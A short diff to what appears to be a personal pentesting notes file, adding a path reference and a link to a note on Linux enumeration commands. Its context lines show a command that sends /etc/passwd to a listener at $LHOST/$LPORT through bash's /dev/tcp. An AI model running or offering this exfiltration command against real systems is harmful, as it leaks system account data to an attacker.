@@ -4,6 +4,8 @@ cat /etc/passwd > /dev/tcp/$LHOST/$LPORT
 bash -c "cat /etc/passwd > /dev/tcp/$LHOST/$LPORT"
 ```
 
+` zet/20221003150904/README.md `
+
 # Related
 
 - [20221003150920](/zet/20221003150920/README.md) linux enumeration quick commands
